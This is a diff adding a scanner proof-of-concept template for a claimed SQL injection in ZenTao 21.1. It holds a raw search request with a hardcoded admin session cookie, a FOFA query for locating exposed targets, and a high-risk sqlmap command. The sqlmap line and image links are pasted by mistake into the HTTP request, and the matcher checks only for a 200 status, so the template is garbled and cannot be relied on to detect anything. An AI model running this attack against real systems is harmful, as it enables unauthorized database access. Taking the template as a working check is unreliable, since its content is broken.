@@ -1,0 +1,51 @@
+id: poc-ghnbqaxmhp1hn6rn
+info:
+  name: 禅道21.1开源版存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ghnbqaxmhp1hn6rn'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ghnbqaxmhp1hn6rn
+    fofa: app="易软天创-禅道系统"
+http:
+- raw:
+  - 'GET /index.php?m=search&f=index&words=1&type=all&zin=1 HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
+
+    Accept: /
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Accept-Encoding: gzip, deflate, br
+
+    Referer: [http://192.168.88.6/](http://192.168.88.6/)
+
+    X-ZIN-Options: {"selector":["#configJS","title>","body>*"],"type":"list"}
+
+    X-ZIN-App: search
+
+    X-Zin-Cache-Time: 0
+
+    X-Requested-With: XMLHttpRequest
+
+    Connection: keep-alive
+
+    Cookie: zentaosid=d5ikdmm295l1ca5ec4an8p4f7u; lang=zh-cn; vision=rnd; device=desktop; theme=default; keepLogin=on; za=admin; zp=abd630d8e942046184fb94d4e591e66cd011665a; hideMenu=false; tab=search
+
+    Priority: u=4
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1739274051073-86fb4ad0-0be5-440f-9cfd-7d95ad467356.png)
+
+    python sqlmap.py -r 1.txt --level=5 --risk=3 --threads=10 --dbms=mysql
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1739274051394-545ddf11-4583-44eb-accf-fa6ccd3f4239.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
